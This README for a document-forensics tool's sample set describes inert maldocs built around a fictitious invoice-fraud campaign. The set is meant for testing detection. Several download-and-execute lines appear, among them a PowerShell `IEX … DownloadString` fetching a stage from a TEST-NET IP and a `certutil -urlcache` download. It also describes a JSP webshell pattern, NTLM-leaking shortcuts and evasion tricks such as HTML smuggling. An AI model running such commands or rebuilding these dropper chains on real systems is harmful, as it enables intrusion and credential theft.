# Samples

Realistic, **benign** sample files — one per supported type — to try every
DocuTraceX module. Upload any of them and open the case in **Components**.

<!-- id: gmzpt -->

They all tell one fictitious story: an **invoice-fraud campaign** that
impersonates a supplier, *Suministros Iberia S.L.*, against the finance team of
*Grupo Ejemplo* ("factura 2026-0187 pendiente de pago — hemos cambiado nuestra
cuenta bancaria"). Each file is a structurally real document of its type and
carries the techniques real maldocs use.

> **Nothing here is malware.** Every host is a reserved `*.example` domain
> (RFC 2606), every address a TEST-NET IP (RFC 5737), and the "payloads" are
> inert placeholders (`MZ` + a text line, `MsgBox` scripts). The macros and
> scripts reference those inert values only.

## Getting the files

The samples are stored **compressed and encrypted** in `samples/samples.zip`
with the customary password **`infected`**, so antivirus engines, mail gateways
and Git hosting scanners do not flag or quarantine them (they would: the files
carry real exploit *structures*, even if every payload is inert).

```bash
python scripts/make_samples.py --extract   # unpack into samples/ (git-ignored)
python scripts/make_samples.py             # regenerate samples/samples.zip
```

Or open the archive with 7-Zip, WinRAR or Windows Explorer (password `infected`).
The test suite unpacks it on its own.

## Campaign indicators (all inert)

| Indicator | Role |
|---|---|
| `cdn-update.example.net` — `http://cdn-update.example.net/files/upd.bin` | payload download |
| `198.51.100.23` — `http://198.51.100.23/plantillas/Normal.dotm`, `/a.ps1` | remote template, PowerShell stage 2 |
| `203.0.113.47` | sending VPS, OLE2Link target, form collector |
| `login.rnicrosoft-online.example` | look-alike Microsoft 365 login (phishing page) |
| `suministros-iberia.example.com` | the impersonated supplier |
| `pagos.suministros@mail-box.example.org` | Reply-To used to divert the payment |

<!-- c9omYR6Yrv -->

## What each file contains

| File | What you should see |
|---|---|
| `sample.docm` | *Factura 2026-0187*. VBA downloader (`AutoOpen`/`Document_Open`, `URLDownloadToFileA` declare, hex-decoded URL, `WScript.Shell.Run`), Base64 PowerShell stored in a **document variable**, a **DDEAUTO** field, custom properties, rsids. ViperMonkey emulates the download and the commands. |
| `sample.docx` | Commercial proposal with **remote template injection** (`attachedTemplate` → `198.51.100.23`) and an `INCLUDEPICTURE` tracking image. No macros. |
| `sample.dotx` / `sample.dotm` | Corporate template with a tracking image / a **global template** with `AutoExec` persistence (copies itself to Word STARTUP) and `AutoNew`, plus a remote template. |
| `sample.xlsx` | Invoice sheet with `WEBSERVICE` / `FILTERXML` formulas and a **hidden** sheet holding the "new IBAN". |
| `sample.xlsm` `.xltm` `.xlam` | Same, plus a **very-hidden Excel 4.0 macro sheet** with `Auto_Open` → `CALL(urlmon, URLDownloadToFileA)` + `EXEC(rundll32 …)`, and VBA `Workbook_Open` (XMLHTTP + ADODB.Stream + Shell). |
| `sample.xltx` | Template version of the invoice workbook (no macros). |
| `sample.xlsb` | oletools' benign Excel 4.0 test file (`ALERT` + `HALT` in an XLM macro sheet with `Auto_Open`); see *Third-party* below. |
| `sample.pptx` `.potx` `.sldx` | "New supplier payment procedure" slides with a link to the look-alike login page. |
| `sample.ppsx` | Slideshow with the **mouse-over `ppaction://program`** trick (PowerShell download on hover). |
| `sample.pptm` `.potm` `.ppsm` `.ppam` `.sldm` | Same slides plus VBA `Auto_Open` launching `mshta` through WMI (`Win32_Process.Create`). |
| `sample.doc` | Legacy Word binary: the VBA downloader, SummaryInformation, and an **Equation Editor** object in the ObjectPool (CVE-2017-11882 shape). |
| `sample.dot` | Legacy template with `AutoExec`/`AutoNew` and an **OLE Package** carrying `Factura.pdf.vbs` (extracted and scanned recursively). |
| `sample.xls` `.xlt` `.xla` | BIFF8 workbook with a **very-hidden Excel 4.0 macro sheet** and VBA `Workbook_Open`. |
| `sample.ppt` `.pot` | Legacy PowerPoint with data **appended after the compound file**. |
| `sample.rtf` | RTF invoice: **Equation Editor** object with junk inside `\objdata`, **OLE2Link** + `\objupdate` (CVE-2017-0199) to `203.0.113.47`, an **OLE Package** (`Factura.pdf.vbs`), remote `\*\template`, `INCLUDEPICTURE` and a hyperlink field. |
| `sample.pdf` | Invoice lure "protected by Microsoft 365": **OpenAction JavaScript** obfuscated with `eval(unescape(...))` that exports and opens the embedded `report.docm` and launches the phishing URL (the V8 sandbox unfolds it), a **Launch** action, a link and a **QR code** to the look-alike login, a credential **form submitting** to `203.0.113.47`, and the macro document **embedded**. |
| `sample.eml` | The phishing email: SPF/DKIM/DMARC fail, two `Received` hops from `203.0.113.47`, PHPMailer, Reply-To diversion, a **DKIM signature broken by a later edit** of the amount (1.250,00 → 7.250,00), a **Safe Links + Proofpoint** wrapped link to the look-alike domain, hidden text and a tracking pixel. Attachments: `report.docm`, `pedido.doc` (**the RTF disguised as .doc**), `Factura_2026-0187.pdf.exe` (double extension), `Factura.html` (**HTML smuggling**: `atob` → Blob → download, then redirect) and `escanear.png` (**QR code**). All attachments are analysed recursively. |
| `sample.emlx` | The same message in Apple Mail's `.emlx` wrapper. |
| `sample.msg` | The same message as an Outlook `.msg` (MAPI streams, HTML body, the same attachments). |
| `encrypted/sample_encrypted.eml` | Gateway evasion: `Factura_2026-0187.zip` (**WinZip AES**) holding a **password-protected** `.xlsm`, with *"La contraseña del archivo es: Fact2026"* in the body. DocuTraceX finds the password, opens the ZIP and the workbook, and analyses the macros inside (Nested tab). |
| `encrypted/sample_velvet.xlsm` | The macro workbook encrypted with Excel's built-in **`VelvetSweatshop`** password (opens without a prompt, scanners see only ciphertext): decrypted automatically, flagged high, and the decrypted copy analysed. |

## Deobfuscation demos (standalone scripts)

Dropped/attached scripts whose intent only shows **after deobfuscation** — one per engine, so uploading each exercises the "deobfuscate first, then analyse" path. All inert: the recovered payloads reference the same campaign indicators (`198.51.100.23/a.ps1`, `cdn-update.example.net`). Open **Components → the language tab**: the **Deobfuscated** view carries the recovered code (hits highlighted) with Folder/Download, and **Original (obfuscated)** is one click away.

| File | What you should see |
|---|---|
| `sample_dropper.js` | A `.js` whose whole body is `eval(unescape("%..%.."))` (one long run of percent escapes — the reference case). The multi-pass decoder peels it to a JScript dropper: `MSXML2.XMLHTTP` GET of `cdn-update.example.net`, then `WScript.Shell.Run` of `powershell … -enc <Base64>`. **JavaScript** tab. |
| `sample_obfuscatorio.js` | A `.js` obfuscated with **obfuscator.io** (string-array + rotator + accessor, control-flow flattening) — the scheme the pure-Python cascade can't flatten. With **webcrack** provisioned (portable Node), the Deobfuscated view shows the clean `function stage(){ … }` with the real URL, `powershell -enc …` and `ActiveXObject("WScript.Shell").Run`. **JavaScript** tab. |
| `sample_stage2.ps1` | A PowerShell stage-2 loader hidden behind backticks (`` I`E`X ``) + Base64 (`[Convert]::FromBase64String`). Deobfuscates to `IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/a.ps1')`. With **box-ps** provisioned (portable PowerShell Core), the PowerShell tab also shows a **Sandbox** section with the emulated behaviour. **PowerShell** tab. |
| `sample_dropper.vbs` | A `.vbs` that builds the stage-2 URL from `Chr()` codes and runs PowerShell through an `Execute()` wrapper. The string resolver recovers the URL and unwraps the `WScript.Shell.Run`. **VBScript** tab. |
| `sample_dropper.bat` | A `.bat` using caret escaping (`p^o^w^e^r^shell`) + `set` indirection (`%a%%b%`) to hide a `powershell -enc` launch and a `certutil -urlcache` download. The batch deobfuscator resolves it; rules fire for PowerShell/LOLBin/download. **Batch** tab. |
| `sample_loader.hta` | An `.hta` carrying **both** a VBScript block (`WScript.Shell.Run powershell …`) and a JScript block (`MSXML2.XMLHTTP` GET + `WScript.Shell.Run`). Exercises HTA container extraction into the VBScript **and** JavaScript engines at once. |
| `sample_dropper.py` | A `.py` dropper: `urllib.request.urlopen` of `198.51.100.23`, a `subprocess.Popen("powershell … -enc <Base64>", shell=True)` and an `exec(base64.b64decode(...))` wrapper. The light decoder peels the wrapper; rules fire for download, subprocess, LOLBin, exec and the attack chain. **Python** tab. |
| `sample_dropper.pyc` | The same dropper **byte-compiled**. With **pycdc** provisioned it decompiles to source; otherwise the engine reconstructs the dotted calls (`urllib.request.urlopen`, `subprocess.Popen`…) and strings from the bytecode. Same findings, plus the recovered Python version. **Python** tab. |
| `sample_pyinstaller.exe` | A minimal **PyInstaller-frozen** `.exe`: a PE stub with a CArchive holding the dropper as an entry script. DocuTraceX finds the `MEI` cookie, unpacks the CArchive/PYZ, writes the module back as `.pyc` and analyses it — **PyInstaller** tab (version, entries), **Python** tab (the recovered code) and **Nested** tree. The PE also keeps its hashes/YARA/report. |
| `lab/dropper_bundle.zip` | A plain ZIP bundling the scripts, shortcuts and Python above (`.js`, obfuscator.io `.js`, `.ps1`, `.vbs`, `.bat`, `.hta`, `.pdf.lnk`, `.url`, `.msi`, `.py`, `.pyc`). Upload it to exercise the **recursive (nested)** path: each child is parsed/deobfuscated on its own, and the recovered URLs appear as the child's IOCs (Nested tab). |

> The same engines run on these scripts wherever they hide — as a standalone upload, as an email/OLE attachment, or inside an archive — not only as loose files.

## Shortcuts and binaries

| File | What you should see |
| --- | --- |
| `sample_shortcut.pdf.lnk` | A `.lnk` disguised as a PDF (**double extension** `…pdf.lnk`) whose target is `cmd.exe` launching a hidden, Base64-encoded PowerShell stage. The **Shortcut** tab shows the target, arguments, working dir, icon and metadata; rules fire for the LOLBin target, the hidden window and the double extension, and the decoded `-enc` payload goes through the scripting engine (`IEX … DownloadString('http://198.51.100.23/a.ps1')` → PowerShell findings). |
| `sample_shortcut.url` | An Internet Shortcut whose `URL=` points to a **remote executable** over `file://203.0.113.47/…` (WebDAV/SMB) and whose `IconFile=` sits on a **UNC path** (forces SMB auth → NTLM hash theft). The **Shortcut** tab lists the URL/icon; rules fire for the remote-file target, the UNC-icon NTLM leak and the executable payload. |
| `sample_installer.msi` | A Windows Installer (OLE/CFB). DocuTraceX decodes the mangled stream names, flags the **CustomAction**, **InstallExecuteSequence** and **Binary** tables, finds the **embedded Binary stream** (inert `MZ` stub), and mines `_StringData` — the PowerShell downloader it carries runs through the scripting engine (`IEX … DownloadString(…)`). **MSI** tab. |

> `.exe`/`.dll` and other PE images are **categorised and triaged** (type, architecture, a "use a dedicated RE/AV tool" note) and keep the generic file record (hashes, YARA, report) — they are not statically unpacked.

## Java

| File | What you should see |
| --- | --- |
| `sample_app.jar` | An executable JAR. The **Java** tab shows the MANIFEST (`Main-Class`, and a `Premain-Class` → **Java agent** finding) and the bundled `Shell.class`, whose constant pool references `Runtime.exec`, `java.net.URL.openStream`, `ScriptEngineManager`, `defineClass`, `javax.crypto` and a stage URL — rules fire for exec/download/script-engine/defineClass/base64/crypto and the attack chain. With **CFR** + a JVM the class is decompiled to source; otherwise the constant pool carries the signal. The archive is also unpacked into the **Nested** tree. |
| `sample_webshell.war` | A WAR with a **JSP webshell** (`request.getParameter("cmd")` → `Runtime.getRuntime().exec`), a `web.xml` servlet mapping and a bundled `Shell.class`. The **Java** tab flags the JSP input + exec and the web descriptor; entries are recursed in **Nested**. |

> `.jar`/`.war`/`.ear` are ZIP packages, so they are extracted and every entry (including nested jars) is scanned recursively; loose `.class`/`.jsp` are analysed directly.

## Lab: test the network checks safely

`lab/phish_lab.eml` (inside the archive) is the same campaign with its link and an attached login form pointing to a **local phishing-kit simulator**:

```bash
python scripts/phish_lab.py      # serves http://127.0.0.1:8808 (Ctrl+C to stop)
```

Open the email in DocuTraceX and press **Check** on the `127.0.0.1` URL in the IOCs tab. The simulator behaves like a real kit: a bot filter (no browser headers → 404), a redirect, a Microsoft 365 look-alike login prefilled with the address from the link, an obfuscated script that "exfiltrates" to a `*.example` URL, a different page for iPhones (cloaking), and — after **Send fake credentials** — an MFA page linking to a `.docm` download. The simulator's console prints the fake identity it receives.

## Third-party

| File | Source | License |
|---|---|---|
| `sample.xlsb` | [oletools](https://github.com/decalage2/oletools) `tests/test-data/excel4-macros/excel4_sample_macro.xlsb` (benign: `ALERT` + `HALT`) | BSD-2-Clause, © Philippe Lagadec |

<!-- gmzpt -->

Everything else is generated by `scripts/make_samples.py` with the builders in
`scripts/` (`officekit`, `ovba`, `cfb`, `rtfkit`, `pdfkit`, `mailkit`, `mkmsg`).
